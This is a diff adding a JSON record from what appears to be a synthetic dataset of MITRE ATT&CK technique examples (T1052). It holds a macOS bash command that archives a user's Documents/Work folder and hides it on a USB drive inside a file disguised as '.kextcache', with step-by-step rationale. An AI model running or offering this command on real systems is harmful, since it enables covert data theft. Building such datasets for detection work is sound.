@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "dd if=/dev/zero of=\"/Volumes/UNTITLED/.kextcache\" bs=1m count=0 seek=200 && tar -czf - \"$HOME/Documents/Work\" | dd of=\"/Volumes/UNTITLED/.kextcache\" bs=1m conv=notrunc && sync",
+  "explanation": "Creates a sparse container file on the external drive and then writes a compressed archive into it without truncating, using dd to disguise content within a large file.",
+  "rationale_steps": [
+    "Pre-create a large sparse file on the USB to blend into disk usage.",
+    "Compress target data to stream form.",
+    "Write into the container with dd conv=notrunc to avoid changing file size metadata.",
+    "Sync to ensure all data is persisted offline."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-24937b47-84fb1661",
+  "source_prompt_hash": "24937b47",
+  "timestamp_utc": "2025-09-30T05:19:16.168507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
